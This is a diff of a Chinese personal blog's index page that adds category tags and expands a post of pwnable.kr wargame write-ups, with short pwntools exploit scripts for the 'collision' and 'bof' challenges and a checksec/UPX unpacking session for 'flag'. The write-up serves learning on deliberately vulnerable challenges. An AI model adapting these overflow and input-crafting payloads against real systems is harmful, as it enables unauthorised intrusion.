@@ -373,6 +373,28 @@
           </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -394,7 +416,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  169
+                  332
                 </span>
               
 
@@ -433,9 +455,11 @@
       
         
           
-            <p>&emsp;&amp;emsp学习了好多天的逆向工程，是时候通过实战学习一些hacking skill了。<br>总结一下自己遇到的问题与解决方案。</p>
-<p>###collision<br>ssh 上去后，有源码分析源码。两个条件，1.参数length 20 bytes；2.将字符串参数转为int后，5次int值相加为<code>0x21DD9#C</code>.可以构造<code>0x21DD09EC = 0x06C5CEC8 * 4 + 0x06C5CECC</code>(左边除以5),原因：防止\x00字符串截断。exploit如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">payload = p32(0x21dd09ec) * 4 + p32(0x06c5cecc)</span><br><span class="line">p = ssh(host=&quot;pwnable.kr&quot;,user=&quot;col&quot;,password=&quot;guest&quot;,port=2222)</span><br><span class="line"></span><br><span class="line">c = p.process(argv=[&apos;col&apos;,payload],executable=&apos;./col&apos;)</span><br><span class="line"></span><br><span class="line">print(c.recv())</span><br><span class="line">#./col `python -c &apos;print &quot;\xc8\xce\xc5\x06&quot; *4 + &quot;\xcc\xce\xc5\x06&quot;&apos;`</span><br></pre></td></tr></table></figure></p>
-
+            <p>&emsp;学习了好多天的逆向工程，是时候通过实战学习一些hacking skill了。<br>总结一下自己遇到的问题与解决方案。</p>
+<h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><p>ssh 上去后，有源码分析源码。两个条件，1.参数length 20 bytes；2.将字符串参数转为int后，5次int值相加为<code>0x21DD9#C</code>.可以构造<code>0x21DD09EC = 0x06C5CEC8 * 4 + 0x06C5CECC</code>(左边除以5),构造原因：防止0x00字符串截断即可。exploit如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">payload = p32(0x06c5cec8) * 4 + p32(0x06c5cecc)</span><br><span class="line">p = ssh(&apos;col&apos;,&apos;pwnable.kr&apos;,password=&apos;guest&apos;,port=2222)</span><br><span class="line"></span><br><span class="line">c = p.process(argv=[&apos;col&apos;,payload],executable=&apos;./col&apos;)</span><br><span class="line"></span><br><span class="line">print(c.recv())</span><br><span class="line">#./col `python -c &apos;print &quot;\xc8\xce\xc5\x06&quot; *4 + &quot;\xcc\xce\xc5\x06&quot;&apos;`</span><br></pre></td></tr></table></figure></p>
+<h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><p>分析源码，简单的栈溢出，用ida查看栈结构，变量overflowme与key相差52字节。<br>exploit:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">payload = &apos;a&apos;*52 + p32(0xcafebabe)</span><br><span class="line">p = remote(&apos;pwnable.kr, 9000)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>下载文件，运行下，没有用信息，checksec该文件，发现upx， 去壳，导入ida，分析源码，即可发现flag。<br>gadgets：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$./flag</span><br><span class="line">I will malloc() and strcpy the flag there. take it.</span><br><span class="line"></span><br><span class="line">$ file flag</span><br><span class="line">flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, not stripped</span><br><span class="line"></span><br><span class="line">$ checksec flag</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br><span class="line">$upx -d flag</span><br><span class="line">$strings flag | grep -i upx</span><br><span class="line">UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure></p>
+<h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode:"></a>passcode:</h3>
           
         
       
@@ -524,6 +548,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -835,6 +881,28 @@
           </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -993,6 +1061,28 @@
           </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -1148,6 +1238,28 @@
           </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -1169,7 +1281,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  620
+                  628
                 </span>
               
 
@@ -1207,7 +1319,7 @@
 
       
         
-          <p>&emsp;&emsp;<strong>netcat</strong>，瑞士军刀，通过tcp和udp在网络读写数据。能和其他工具或脚本结合使用，做出amazing thing！！你可以通过它做服务器，聊天，传输、下载数据等等。。<br>下面学习一些实例：<br>
+          <p>&emsp;&emsp;<strong>netcat</strong>，瑞士军刀，通过tcp和udp在网络读写数据。能和其他工具或脚本结合使用，做出amazing thing！！你可以通过它做服务器，聊天，传输、下载数据等等。。<br>下面是动手实践：<br>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/10/28/nc—网络瑞士军刀/#more" rel="contents">
@@ -1634,7 +1746,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -1729,7 +1841,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">4.8k</span>
+    <span title="Site words total count">5k</span>
   
 -->
 </div>
@@ -1751,7 +1863,7 @@
 <span class="post-meta-divider">|</span>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共4.8k字</span>
+  <span class="post-count">博客全站共5k字</span>
 </div>
 
         
